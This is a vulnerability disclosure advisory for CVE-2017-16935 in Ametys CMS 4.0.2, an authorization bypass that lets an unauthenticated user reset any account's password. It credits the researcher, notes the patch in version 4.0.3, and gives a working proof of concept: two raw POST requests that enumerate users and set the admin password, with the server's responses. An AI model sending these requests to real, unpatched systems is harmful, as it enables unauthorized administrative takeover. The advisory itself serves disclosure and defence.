## Vulnerability Summary
The following advisory describes a password reset vulnerability found in Ametys CMS version 4.0.2

Ametys is “a free and open source content management system (CMS) written in Java. It is based on JSR-170 for content storage, Open Social for gadget rendering and a XML oriented framework.”

## Credit
An independent security researcher, Jose Luis, has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program

## Vendor response
Ametys has released patches to address this vulnerability – Ametys version 4.0.3

For more details: https://issues.ametys.org/browse/RUNTIME-2582

CVE-2017-16935

## Vulnerability details
User controlled input is not sufficiently sanitized. Unauthenticated user can perform administrative operations without properly authorization.

Ametys CMS only checks the authorization if the request includes /cms/ in the web request.

By that, we can reset any password of users, including administrator users

## Proof of Concept
By sending the following POST request, we can obtain the list of users:

```
POST /plugins/core-ui/servercomm/messages.xml HTTP/1.1
Host: 192.168.196.128:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.196.128:8080/cms/www/index.html
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 213
Cookie: JSESSIONID=
Connection: close

content={"0":{"pluginOrWorkspace":"core","responseType":"text","url":"users/search.json","p

arameters":{"contexts":["/sites/www","/sites-
fo/www"],"criteria":"","limit":100,"page":1,"start":0}}}}&context.parameters={}
```

The server then will response with:

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
X-Cocoon-Version: 2.1.13-dev
Content-Type: text/xml
Date: Tue, 03 Oct 2017 13:52:15 GMT
Connection: close
Content-Length: 1875

<?xml version="1.0" encoding="UTF-8"?><responses><response id="0" code="200"
duration="946">{"users":[{"firstname":"Simple","sortablename":"Contributor
Simple","populationLabel":"Ametys Demo
Users","populationId":"ametys_demo_users","fullname":"Simple
Contributor","login":"contrib","directory":"SQL
database","email":"contrib@example.com","lastname":"Contributor"},{"firstname":"User1","s

ortablename":"User1 User1","populationLabel":"FO Demo Users","populationId":"fo-demo-
users","fullname":"User1 User1","login":"user1@ametys.org","directory":"SQL

database","email":"user1@ametys.org","lastname":"User1"},{"firstname":"User3","sortablena

me":"User3 User3","populationLabel":"FO Demo Users","populationId":"fo-demo-
users","fullname":"User3 User3","login":"user3@ametys.org","directory":"SQL

database","email":"user3@ametys.org","lastname":"User3"},{"firstname":"Webmaster","sorta
blename":"User Webmaster","populationLabel":"Ametys Demo
Users","populationId":"ametys_demo_users","fullname":"Webmaster
User","login":"webmaster","directory":"SQL
database","email":"webmaster@example.com","lastname":"User"},{"firstname":"Manager","s
ortablename":"User Manager","populationLabel":"Ametys Demo
Users","populationId":"ametys_demo_users","fullname":"Manager
User","login":"manager","directory":"SQL
database","email":"manager@example.com","lastname":"User"},{"firstname":"Administrator"
,"sortablename":"User Administrator","populationLabel":"Ametys Demo
Users","populationId":"ametys_demo_users","fullname":"Administrator
User","login":"admin","directory":"SQL
database","email":"admin@example.com","lastname":"User"},{"firstname":"User2","sortable

name":"User2 User2","populationLabel":"FO Demo Users","populationId":"fo-demo-
users","fullname":"User2 User2","login":"user2@ametys.org","directory":"SQL

database","email":"user2@ametys.org","lastname":"User2"}]}</response></responses>
```

The value of the field “populationId” and “login”, we need these values for the next request

Now, we need perform another request to change the password of the admin user:

```
POST /plugins/core-ui/servercomm/messages.xml HTTP/1.1
Host: 192.168.196.128:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
Accept: */*
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.196.128:8080/cms/www/index.html
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 345
Cookie: JSESSIONID=
Connection: close

content={"0":{"pluginOrWorkspace":"core-ui","responseType":"text","url":"client-
call","parameters":{"role":"org.ametys.plugins.core.user.UserDAO","methodName":"editUser"

,"parameters":["ametys_demo_users",{"login":"admin","password":"MYNEWPASSWORD","fi
rstname":"Administrator","lastname":"User","email":"admin@example.com"}]}}}&context.par
ameters={}
```

Once we have performed the request, the response is:

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
X-Cocoon-Version: 2.1.13-dev
Content-Type: text/xml
Date: Tue, 03 Oct 2017 13:52:59 GMT
Connection: close
Content-Length: 374

<?xml version="1.0" encoding="UTF-8"?><responses><response id="0" code="200"
duration="110">{"firstname":"Administrator","sortablename":"User
Administrator","populationLabel":"Ametys Demo
Users","populationId":"ametys_demo_users","fullname":"Administrator
User","login":"admin","directory":"SQL
database","email":"admin@example.com","lastname":"User"}</response></responses>
```

Now you can log in as Admin with password MYNEWPASSWORD